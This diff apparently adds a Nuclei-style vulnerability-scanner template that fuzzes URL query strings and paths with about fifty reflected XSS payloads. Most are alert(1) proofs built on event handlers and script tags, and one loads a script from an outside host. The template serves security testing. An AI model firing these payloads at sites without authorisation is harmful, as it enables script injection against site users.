@@ -1,0 +1,96 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<video autoplay controls onseeking=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<basefont onmouseup=\"alert(1)\">test</basefont>"
+        - "</br><img src=x onerror=alert(1)>"
+        - "<plaintext draggable=\"true\" ondragleave=\"alert(1)\">test</plaintext>"
+        - "<body style=\"x:\\expression(javascript:alert(1))\" onbeforecut=\"alert(1)\" contenteditable>test</body>"
+        - "<dialog draggable=\"true\" ondragstart=\"alert(1)\">test</dialog>"
+        - "<SCRIPT>alert(1)</SCRIPT>"
+        - "<svg><time id=x tabindex=1 onfocusin=alert(1)></time>"
+        - "<menu id=x tabindex=1 onfocusin=alert(1)></menu><input autofocus>"
+        - "<mark onkeydown=\"alert(1)\" contenteditable>test</mark>"
+        - "</div><input id=x autofocus><img src=onerror=alert(1)"
+        - "<style>:target {transform: rotate(180deg);}</style><noscript id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></noscript>"
+        - "<details onclick=\"alert(1)\">test</details>"
+        - "<blink draggable=\"true\" ondragleave=\"alert(1)\">test</blink>"
+        - "<frame onblur=alert(1) id=x></frame><input autofocus>"
+        - "<html draggable=\"true\" ondragleave=\"alert(1)\">test</html>"
+        - "<html ontouchmove=\"alert(1)\"></html><script>javascript:alert(1)</script>"
+        - "<ul draggable=\"true\" ondragend=\"alert(1)\">test</ul>"
+        - "<frameset><frame src=\"javascript:alert(1)\"></frameset>"
+        - "<xmp id=x tabindex=1 onactivate=alert(1)></xmp><input autofocus>"
+        - "<dl draggable=\"true\" ondragenter=\"alert(1)\">test</dl>"
+        - "<video controls autoplay onpause=alert(1)><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<input id=x tabindex=1 ondeactivate=alert(1)>"
+        - "<video draggable=\"true\" ondragenter=\"alert(1)\">test</video>"
+        - "<output id=x tabindex=1 onfocusin=alert(1)></output><input autofocus>"
+        - "<menuitem id=x tabindex=1 ondeactivate=alert(1)></menuitem><input autofocus>"
+        - "&lt;SCRIPT SRC=http://ha.ckers.org/xss.js&gt;&lt;/&lt;SCRIPT&gt;"
+        - "<script>alert(1)</script>"
+        - "<video controls autoplay><source src=\"validvideo.mp4\" type=\"video/mp4\"></video>"
+        - "<;A HREF=\";<URL>\"<;XSS>;"
+        - "<SCRIPT>alert(1)</script>"
+        - "<style>:target {color:red;}</style><table id=x style=\"transition:color 1s\" ontransitioncancel=alert(1)></table>"
+        - "<svg><script>alert(1)</script></svg>"
+        - "<mark id=x tabindex=1 onfocusout=alert(1)></mark>"
+        - "<script>alert(1)</script"
+        - "<output id=x tabindex=1 onfocusin=alert(1)></output><input autofocus>"
+        - "<applet id=x tabindex=1 onfocusin=alert(1)></applet>"
+        - "<script>alert(1)</script>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><img alt=\"\" ondrop=alert(1) contenteditable>drop here</img></contenteditable>"
+        - "<style>:target {transform: rotate(180deg);}</style><figcaption id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></figcaption>"
+        - "<time id=x tabindex=1 onbeforeactivate=alert(1)></time><input autofocus>"
+        - "<script>alert(1)</script>"
+        - "<picture id=x tabindex=1 ondeactivate=alert(1)></picture><input id=y autofocus>"
+        - "<time id=x tabindex=1 onfocusin=alert(1)></time>"
+        - "<details id=x tabindex=1 ondeactivate=alert(1)></details><input id=y autofocus>"
+        - "<sub onmouseup=\"alert(1)\">test</sub>"
+        - "<IMG SRC=x onblur=alert(1)>"
+        - "<SCRIPT>alert(91)</SCRIPT><bdi onclick=\"alert(1)\">test</bdi>"
+        - "<font id=x tabindex=1 onfocusin=alert(1)></font><input autofocus>"
+        - "<del draggable=\"true\" ondragend=\"alert(1)\">test</del>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
